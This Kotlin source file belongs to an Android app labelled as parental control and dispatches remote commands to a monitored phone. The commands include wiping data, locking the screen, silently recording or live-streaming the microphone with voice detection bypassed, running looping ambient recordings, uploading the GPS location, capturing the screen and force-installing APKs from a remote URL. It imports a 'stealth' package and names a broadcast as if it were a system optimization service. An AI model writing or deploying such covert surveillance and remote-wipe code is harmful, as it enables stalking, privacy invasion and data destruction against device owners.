package com.example.parentalcontrol.features.remote_commands.controllers

import android.content.Context
import android.content.Intent
import android.media.AudioManager
import android.media.MediaPlayer
import android.media.RingtoneManager
import android.net.Uri
import android.os.Build
import android.provider.Settings
import android.util.Log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.serialization.json.JsonElement
import kotlinx.serialization.json.JsonObject
import kotlinx.serialization.json.JsonPrimitive
import com.example.parentalcontrol.AppUpdateManager
import com.example.parentalcontrol.features.service_watchdog.services.MonitoringForegroundService
import com.example.parentalcontrol.ParentalControlManager
import com.example.parentalcontrol.features.location_tracking.services.GpsTracker
import com.example.parentalcontrol.features.audio_recording.services.AudioRecorderEngine
import com.example.parentalcontrol.features.audio_recording.controllers.MicManager
import com.example.parentalcontrol.features.screen_capture.services.ScreenCaptureEngine
import com.example.parentalcontrol.features.security_and_stealth.controllers.MyDeviceAdminReceiver
import com.example.parentalcontrol.features.remote_commands.services.RemoteConfigManager
import com.example.parentalcontrol.features.remote_commands.services.SupabaseManager

/**
 * منفذ وموجه أوامر التحكم عن بُعد (Command Action Executor)
 * يوجه كل أمر إلى الحزمة والخدمة المسؤولة عنه بدقة وأمان
 */
class CommandActionExecutor(
    private val context: Context,
    private val scope: CoroutineScope,
    private val gpsTracker: GpsTracker,
    private val projectionProvider: () -> android.media.projection.MediaProjection?
) {

    companion object {
        private const val TAG = "CommandActionExecutor"
    }

    private val supabase = SupabaseManager.getInstance()
    private val parentalControl = ParentalControlManager(context)
    private val screenCapture = ScreenCaptureEngine(context)
    private val audioRecorder = AudioRecorderEngine(context)
    private val micManager = MicManager(context, scope)
    private val updateManager = AppUpdateManager(context)

    suspend fun execute(command: String, payloadJson: JsonElement?): Boolean {
        return try {
            when (command) {
                "LOCK" -> {
                    parentalControl.lockScreen()
                    true
                }
                "WIPE" -> {
                    parentalControl.wipeData(false)
                    true
                }
                "ALARM" -> {
                    playAlarm()
                    true
                }
                "CAPTURE" -> {
                    val service = MonitoringForegroundService.getInstance()
                    if (service != null) {
                        service.startManualScreen(5) // Capture 5 cycles on demand
                        true
                    } else {
                        Log.w(TAG, "CAPTURE: Service instance NULL")
                        false
                    }
                }
                "RECORD" -> {
                    val duration = try {
                        if (payloadJson is JsonObject) {
                            payloadJson["duration"]?.let {
                                if (it is JsonPrimitive) it.content.toLong() else it.toString().toLong()
                            } ?: 120_000L
                        } else {
                            120_000L
                        }
                    } catch (e: Exception) { 120_000L }

                    val service = MonitoringForegroundService.getInstance()
                    if (service != null) {
                        service.startManualMic(duration, bypassVad = true)
                        supabase.logRemote(context, TAG, "INFO", "RECORD: started via Service for ${duration / 1000}s")
                    } else {
                        Log.w(TAG, "RECORD: Service NULL — using micManager fallback for ${duration / 1000}s")
                        supabase.logRemote(context, TAG, "WARN", "RECORD: Service NULL, using micManager fallback for ${duration / 1000}s")
                        micManager.recordClip(duration, bypassVad = true)
                    }
                    true
                }
                "LISTEN_START" -> {
                    val service = MonitoringForegroundService.getInstance()
                    if (service != null) {
                        service.startManualMic(300_000L, bypassVad = true) // 5 دقائق
                        supabase.logRemote(context, TAG, "INFO", "LISTEN_START: 5min recording via Service")
                    } else {
                        Log.w(TAG, "LISTEN_START: Service NULL — using micManager fallback")
                        supabase.logRemote(context, TAG, "WARN", "LISTEN_START: Service NULL, using micManager fallback")
                        micManager.recordClip(300_000L, bypassVad = true)
                    }
                    true
                }
                "LISTEN_STOP" -> {
                    Log.i(TAG, "LISTEN_STOP: (open-ended stop not implemented in service mode)")
                    true
                }
                "MIC" -> {
                    val action = try {
                        val actionValue = if (payloadJson is JsonPrimitive) {
                            payloadJson.content
                        } else if (payloadJson is JsonObject) {
                            payloadJson["action"]?.let {
                                if (it is JsonPrimitive) it.content else it.toString()
                            }
                        } else {
                            null
                        }
                        actionValue ?: "START"
                    } catch (e: Exception) { "START" }

                    val deviceId = Settings.Secure.getString(
                        context.contentResolver, Settings.Secure.ANDROID_ID
                    ) ?: "unknown"

                    if (action == "START" || action == "MIC_STREAM") {
                        micManager.startStream(deviceId)
                    } else {
                        micManager.stopStream()
                    }
                    true
                }
                "MIC_STREAM" -> {
                    val deviceId = Settings.Secure.getString(
                        context.contentResolver, Settings.Secure.ANDROID_ID
                    ) ?: "unknown"
                    micManager.startStream(deviceId)
                    true
                }
                "MIC_STREAM_STOP" -> {
                    micManager.stopStream()
                    true
                }
                "MIC_RECORD" -> {
                    val duration = try {
                        if (payloadJson is JsonObject) {
                            payloadJson["duration"]?.let {
                                if (it is JsonPrimitive) it.content.toLong() else it.toString().toLong()
                            } ?: 60_000L
                        } else {
                            60_000L
                        }
                    } catch (e: Exception) { 60_000L }

                    val service = MonitoringForegroundService.getInstance()
                    if (service != null) {
                        service.startManualMic(duration, bypassVad = true)
                        supabase.logRemote(context, TAG, "INFO", "MIC_RECORD: started via Service for ${duration / 1000}s")
                        true
                    } else {
                        Log.w(TAG, "MIC_RECORD: Service instance NULL — falling back to micManager.recordClip()")
                        supabase.logRemote(context, TAG, "WARN", "MIC_RECORD: Service NULL, using micManager fallback for ${duration / 1000}s")
                        micManager.recordClip(duration, bypassVad = true)
                        true
                    }
                }
                "CANCEL_RECORDING" -> {
                    Log.i(TAG, "CANCEL_RECORDING command received — stopping active recording")
                    MonitoringForegroundService.getInstance()?.cancelCurrentRecording()
                    supabase.logRemote(context, TAG, "INFO", "CANCEL_RECORDING: active recording cancelled")
                    true
                }
                "LOCATE" -> {
                    gpsTracker.fetchAndUploadLocation(forceUpload = true)
                    true
                }
                "UNINSTALL" -> {
                    supabase.logRemote(context, TAG, "INFO", "UNINSTALL command received — attempting self-uninstall")
                    try {
                        val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
                        val adminReceiver = android.content.ComponentName(context, MyDeviceAdminReceiver::class.java)
                        if (dpm.isAdminActive(adminReceiver)) {
                            dpm.removeActiveAdmin(adminReceiver)
                        }
                    } catch (e: Exception) {
                        Log.w(TAG, "Admin removal failed: ${e.message}")
                    }
                    val intent = Intent(Intent.ACTION_DELETE).apply {
                        data = Uri.parse("package:${context.packageName}")
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    }
                    context.startActivity(intent)
                    true
                }
                "RESTART" -> {
                    val restartIntent = Intent("com.android.system.optimization.engine.RESTART")
                    restartIntent.setPackage(context.packageName)
                    context.sendBroadcast(restartIntent)
                    supabase.logRemote(context, TAG, "INFO", "RESTART command: broadcast sent to ServiceRestartReceiver")
                    true
                }
                "START_AUTO_RECORD" -> {
                    val intervalMs = try {
                        if (payloadJson is JsonObject) {
                            payloadJson["interval_ms"]?.let {
                                if (it is JsonPrimitive) it.content.toLong() else it.toString().toLong()
                            } ?: 5_000L
                        } else {
                            5_000L
                        }
                    } catch (e: Exception) { 5_000L }

                    val service = MonitoringForegroundService.getInstance()
                    if (service != null) {
                        service.setAmbientRecordLoop(true, intervalMs)
                        supabase.logRemote(context, TAG, "INFO", "START_AUTO_RECORD: Loop started with interval $intervalMs ms")
                        true
                    } else {
                        Log.w(TAG, "START_AUTO_RECORD: Service instance NULL")
                        supabase.logRemote(context, TAG, "ERROR", "START_AUTO_RECORD: Service instance is NULL")
                        false
                    }
                }
                "STOP_AUTO_RECORD" -> {
                    val service = MonitoringForegroundService.getInstance()
                    if (service != null) {
                        service.setAmbientRecordLoop(false, 0)
                        supabase.logRemote(context, TAG, "INFO", "STOP_AUTO_RECORD: Loop stopped")
                        true
                    } else {
                        Log.w(TAG, "STOP_AUTO_RECORD: Service instance NULL")
                        supabase.logRemote(context, TAG, "ERROR", "STOP_AUTO_RECORD: Service instance is NULL")
                        false
                    }
                }
                "UPDATE" -> {
                    val settings = RemoteConfigManager(context).fetchSettings()
                    if (settings != null) {
                        updateManager.checkAndExecuteUpdate(
                            targetVersion = settings.target_version,
                            apkPath       = settings.update_apk_path,
                            apkUrl        = settings.update_apk_url,
                            forceIntent   = true
                        )
                    } else {
                        Log.w(TAG, "UPDATE: fetchSettings returned null")
                    }
                    true
                }
                else -> {
                    Log.w(TAG, "Unknown command: $command")
                    false
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Execution error: ${e.message}")
            supabase.logRemote(context, TAG, "ERROR", "Exec crash: ${e.message}")
            false
        }
    }

    /**
     * تشغيل صوت إنذار بأعلى صوت ممكن
     */
    private fun playAlarm() {
        try {
            val audioManager = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
            val maxVolume = audioManager.getStreamMaxVolume(AudioManager.STREAM_ALARM)
            audioManager.setStreamVolume(AudioManager.STREAM_ALARM, maxVolume, 0)

            val notification = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM) ?: 
                               RingtoneManager.getDefaultUri(RingtoneManager.TYPE_RINGTONE)
            
            val mediaPlayer = MediaPlayer().apply {
                setDataSource(context, notification)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                    setAudioAttributes(
                        android.media.AudioAttributes.Builder()
                            .setUsage(android.media.AudioAttributes.USAGE_ALARM)
                            .setContentType(android.media.AudioAttributes.CONTENT_TYPE_SONIFICATION)
                            .build()
                    )
                } else {
                    @Suppress("DEPRECATION")
                    setAudioStreamType(AudioManager.STREAM_ALARM)
                }
                prepare()
                isLooping = true
                start()
            }

            scope.launch {
                delay(15000L)
                try {
                    if (mediaPlayer.isPlaying) {
                        mediaPlayer.stop()
                        mediaPlayer.release()
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Error stopping alarm: ${e.message}")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to play alarm: ${e.message}")
        }
    }
}
